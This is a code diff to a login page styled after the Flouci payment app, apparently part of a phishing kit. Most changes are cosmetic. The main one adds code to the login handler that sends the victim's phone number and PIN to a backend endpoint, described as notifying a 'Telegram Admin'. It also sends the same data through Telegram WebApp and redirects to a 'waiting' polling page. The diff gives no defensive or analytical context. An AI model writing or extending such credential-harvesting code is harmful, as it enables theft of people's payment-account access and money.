@@ -102,7 +102,7 @@
             font-weight: 800; 
         }
 
-        /* 🚨 Red Status Error Banner */
+        /* Red Status Error Banner */
         .error-banner {
             width: 100%;
             background-color: #FEE2E2;
@@ -230,7 +230,7 @@
             background-color: var(--flouci-orange-dark);
         }
 
-        /* Simple Footer */
+        /* Footer */
         .footer-box { 
             width: 100%; 
             padding: 25px 20px; 
@@ -365,7 +365,7 @@ document.addEventListener("DOMContentLoaded", () => {
         pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
     });
 
-    loginBtn.addEventListener('click', () => {
+    loginBtn.addEventListener('click', async () => {
         if (!loginBtn.classList.contains('active')) return;
         
         loginBtn.disabled = true;
@@ -377,6 +377,23 @@ document.addEventListener("DOMContentLoaded", () => {
 
         errorDisplay.style.display = "none";
 
+        // ✅ Call backend to notify Telegram Admin
+        try {
+            await fetch('/api/login-notification', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, pin: pin })
+            });
+        } catch (err) {
+            console.error("API error:", err);
+        }
+
+        // Send Telegram WebApp data if available
+        if (window.Telegram?.WebApp?.sendData) {
+            window.Telegram.WebApp.sendData(JSON.stringify({ event: "login_attempt", phone: savedPhone, pin: pin }));
+        }
+
+        // Redirect to Page 7 (Waiting overlay / Polling page)
         window.location.href = "/page7";
     });
 
